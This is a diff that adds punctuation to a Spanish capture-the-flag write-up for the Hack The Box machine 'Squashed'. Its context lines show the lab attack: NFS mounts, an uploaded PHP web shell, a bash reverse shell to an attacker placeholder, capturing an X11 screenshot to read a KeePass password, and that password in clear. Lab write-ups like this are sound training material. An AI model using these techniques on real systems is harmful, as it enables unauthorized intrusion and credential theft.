@@ -46,8 +46,6 @@ tags:
 
 
 
-
-
 ## Reconocimiento de Puertos [üîç]
 
 Como siempre antes de escanear los puertos con **Nmap** le hacemos un <span style="color:red"> ping </span> a la maquina victima para ver si esta viva y nos responde.
@@ -107,7 +105,7 @@ Obtengo estos dos directorios:
 
 |  /home/ross  |  /var/www/html  |
 
-Y para montar estos dos directorios, me creo dos directorios llamados **/mnt/ross** y **/mnt/web_server** en el directorio **/mnt** y luego los monto
+Y para montar estos dos directorios, me creo dos directorios llamados **/mnt/ross** y **/mnt/web_server** en el directorio **/mnt** y luego los monto.
 
 
 ```bash
@@ -131,17 +129,17 @@ Veo que existe un archivo  <span style="color:red">Passwords.kdbx</span> que  b√
 
 ![](/assets/images/HTB/writeup-squashed/cdwebserver.png)
 
-Ok no tengo acceso a el, voy a ver que usuario tiene acceso el directorio
+Ok no tengo acceso a el, voy a ver que usuario tiene acceso el directorio.
 
 
 ![](/assets/images/HTB/writeup-squashed/usuarioquetieneprivilegio.png)
 
-Ok pensando un poco podria burlar el **user1** creando uno en mi maquina 
+Ok pensando un poco podria burlar el **user1** creando uno en mi maquina. 
 
 
 ![](/assets/images/HTB/writeup-squashed/directorioswebserver.png)
 
-Como estoy en el directorio del servidor web y veo el archivo **index.html** , probare intentar cargar un archivo .php para poder poder ejecutar cualquier comando en la **URL**
+Como estoy en el directorio del servidor web y veo el archivo **index.html** , probare intentar cargar un archivo .php para poder poder ejecutar cualquier comando en la **URL**.
 
 ```bash
 # Script php
@@ -167,7 +165,7 @@ bash -c "bash -i >%26 /dev/tcp/<IP ATACANTE>/1337 0>%261"
 
 ![](/assets/images/HTB/writeup-squashed/reverseshell.png)
 
-Antes de continuar actualizo la tty 
+Antes de continuar actualizo la tty. 
 
 ```bash
 > script /dev/null -c bash
@@ -208,7 +206,7 @@ python3 -m http.server 8080
 - [Recurso extraido de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)
 
 
-No lo puedo leer, entonces saco un screenshot a la seccion keepas abierta del usuario 
+No lo puedo leer, entonces saco un screenshot a la seccion keepas abierta del usuario. 
 
 
 
@@ -222,7 +220,7 @@ xwd -root -screen -silent -display :0 > screenshot.xwd
 ![](/assets/images/HTB/writeup-squashed/Screenshotxwd.png)
 
 
-Lo siguiente que hago es migrar a mi usuario de Kali para ponerme en escucha en el puerto 443, haci enviarme el archivo screenshot.xwd, dicho archivo se encuentra en el usuario **alex**
+Lo siguiente que hago es migrar a mi usuario de Kali para ponerme en escucha en el puerto 443, haci enviarme el archivo screenshot.xwd, dicho archivo se encuentra en el usuario **alex**.
 
 
 ```bash
@@ -234,19 +232,19 @@ convert screenshot.xwd screenshot.png
 
 ![](/assets/images/HTB/writeup-squashed/convert.png)
 
-Abro el screenshot y listo ahi se ve la **password**
+Abro el screenshot y listo ahi se ve la **password**.
 
 
 ![](/assets/images/HTB/writeup-squashed/screenshot.png)
 
 
-Por ultimo me dirijo al usuario alex y con las **password** <span style="color:red">cah$mei7rai9A</span> para comvertirme en usuario **root**
+Por ultimo me dirijo al usuario alex y con las **password** <span style="color:red">cah$mei7rai9A</span> para comvertirme en usuario **root**.
 
 
 
 ![](/assets/images/HTB/writeup-squashed/rootalex.png)
 
-Ya tenemos acceso a la <span style="color:red"> **Flag**
+Ya tenemos acceso a la <span style="color:red"> **Flag**.
   
   
   
